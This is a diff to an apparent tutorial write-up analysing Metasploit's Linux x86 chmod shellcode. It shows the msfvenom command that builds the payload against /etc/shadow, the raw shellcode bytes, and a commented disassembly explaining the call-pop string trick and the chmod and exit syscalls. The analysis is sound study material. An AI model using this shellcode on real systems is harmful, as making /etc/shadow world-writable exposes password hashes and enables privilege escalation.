@@ -114,7 +114,7 @@ The **open** syscall gets a handle pointed to the string "/tmp/file.txt".  The *
 Next, we will dissect the **chmod** payload:
 
 ```bash
-> msfvenom -a x86 --platform linux -p linux/x86/chmod -f c
+> msfvenom -a x86 --platform linux -p linux/x86/chmod FILE=/etc/shadow -f c
 No encoder or badchars specified, outputting raw payload
 Payload size: 36 bytes
 Final size of c file: 177 bytes
@@ -124,29 +124,62 @@ unsigned char buf[] =
 "\x80\x6a\x01\x58\xcd\x80";
 ```
 
-The shellcode disassembles to the following:
+Once the shellcode is disassembled (and commented, for discussion), the assembly looks like this:
 
 ```nasm
-00000000  99                cdq
-00000001  6A0F              push byte +0xf
-00000003  58                pop eax
-00000004  52                push edx
-00000005  E80C000000        call 0x16
-0000000A  2F                das
-0000000B  657463            gs jz 0x71
-0000000E  2F                das
-0000000F  7368              jnc 0x79
-00000011  61                popa
-00000012  646F              fs outsd
-00000014  7700              ja 0x16
-00000016  5B                pop ebx
-00000017  68B6010000        push dword 0x1b6
-0000001C  59                pop ecx
-0000001D  CD80              int 0x80
-0000001F  6A01              push byte +0x1
-00000021  58                pop eax
-00000022  CD80              int 0x80
+; chmod.nasm
+;  - Analyzed shellcode from metasploit
+;
+; > msfvenom -a x86 --platform linux -p linux/x86/chmod FILE=/etc/shadow -f c
+
+global _start
+
+section .text
+_start:
+
+        cdq
+        push byte +0xf
+        pop eax
+        push edx
+        call section_2          ; call pop
+
+section_1:
+
+        das                     ; /
+        gs jz 0x71              ; etc
+        das                     ; /
+        jnc 0x79                ; sh
+        popa                    ; a
+        fs outsd                ; do
+        ja 0x16                 ; w\0
+
+section_2:
+
+        ; int chmod(const char *pathname, mode_t mode)
+        ; eax = 0xf (chmod)
+        ; ebx = pointer to section_1
+        ; ecx = 0xb6010000
+
+        pop ebx
+        push dword 0x1b6
+        pop ecx
+        int 0x80
+
+
+        ; void exit(int status)
+        ; eax = 0x1 (exit)
+        ; ebx = 0x0
+
+        push byte +0x1
+        pop eax
+        int 0x80
 ```
+
+Interestingly, rather than using the jmp-call-pop method, this shellcode just uses a call-pop, which still serves the same function of storing a memory address to a string.  Once the string "/etc/shadow" is stored, the shellcode makes two syscalls:
+- chmod
+- exit
+
+Simple enough.
 
 
 Finally, we will dissect the **adduser** payload, produced below:
